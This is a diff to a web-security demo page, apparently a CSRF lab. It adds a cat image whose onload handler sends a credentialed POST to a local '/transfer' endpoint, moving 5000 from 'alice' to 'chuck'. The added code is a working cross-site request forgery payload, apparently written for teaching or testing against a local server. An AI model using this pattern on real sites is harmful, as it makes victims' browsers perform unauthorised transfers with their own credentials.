@@ -2,6 +2,32 @@
 
   <body>
     <h1> hello from evil client server </h1>
+
+    <p>
+      innocent kitty attack
+    </p>
+    <img 
+      onload="doPlainPost()"
+      src="https://d2ph5fj80uercy.cloudfront.net/06/cat1996.jpg"
+      style="width: 80px; height: 80px"
+    />
   </body>
+
+  <script>
+    console.log('script section');
+
+    function plainPostOnLoad() {
+      console.log('onLoad for plain POST request success: ' + this.responseText);
+    }
+
+    function doPlainPost() {
+      var oReq = new XMLHttpRequest();
+      oReq.withCredentials = true;
+      oReq.addEventListener("load", plainPostOnLoad);
+      oReq.open('POST', 'http://localhost:5002/transfer?from=alice&to=chuck&amt=5000');
+      oReq.send();
+    }
+  </script>
+
 
 </html>
